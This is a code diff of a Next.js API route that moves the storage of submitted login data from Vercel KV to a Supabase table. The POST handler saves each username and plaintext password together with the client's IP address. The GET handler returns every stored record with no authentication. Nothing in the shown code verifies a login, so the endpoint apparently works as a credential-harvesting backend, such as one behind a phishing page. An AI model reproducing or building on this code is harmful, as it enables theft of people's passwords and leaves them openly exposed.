@@ -1,13 +1,15 @@
 import { NextRequest, NextResponse } from 'next/server';
-import { kv } from '@vercel/kv';
+import { createClient } from '@supabase/supabase-js';
 
-// Define the type for our login data
-interface LoginData {
-  username: string;
-  password: string;
-  timestamp: string;
-  ip?: string;
+// Initialize Supabase client
+const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
+const supabaseKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;
+
+if (!supabaseUrl || !supabaseKey) {
+  throw new Error('Missing Supabase environment variables');
 }
+
+const supabase = createClient(supabaseUrl, supabaseKey);
 
 export async function POST(request: NextRequest) {
   try {
@@ -33,22 +35,29 @@ export async function POST(request: NextRequest) {
       ip = realIp;
     }
 
-    // Create the data object
-    const loginData: LoginData = {
-      username,
-      password,
-      timestamp: new Date().toISOString(),
-      ip
-    };
+    // Insert data into Supabase
+    const { data, error } = await supabase
+      .from('logins')
+      .insert([
+        { 
+          username, 
+          password, 
+          ip,
+          timestamp: new Date().toISOString()
+        }
+      ])
+      .select();
 
-    // Store data in Vercel KV
-    const loginsKey = 'logins';
-    const existingLogins = await kv.get<LoginData[]>(loginsKey) || [];
-    existingLogins.push(loginData);
-    await kv.set(loginsKey, existingLogins);
+    if (error) {
+      console.error('Supabase error:', error);
+      return NextResponse.json(
+        { error: 'Database error' },
+        { status: 500 }
+      );
+    }
 
     return NextResponse.json(
-      { message: 'Login data stored successfully' },
+      { message: 'Login data stored successfully', data },
       { status: 200 }
     );
   } catch (error) {
@@ -63,8 +72,20 @@ export async function POST(request: NextRequest) {
 // GET endpoint to retrieve login data
 export async function GET() {
   try {
-    const logins = await kv.get<LoginData[]>('logins') || [];
-    return NextResponse.json(logins, { status: 200 });
+    const { data, error } = await supabase
+      .from('logins')
+      .select('*')
+      .order('timestamp', { ascending: false });
+
+    if (error) {
+      console.error('Supabase error:', error);
+      return NextResponse.json(
+        { error: 'Database error' },
+        { status: 500 }
+      );
+    }
+
+    return NextResponse.json(data || [], { status: 200 });
   } catch (error) {
     console.error('Error reading login data:', error);
     return NextResponse.json(
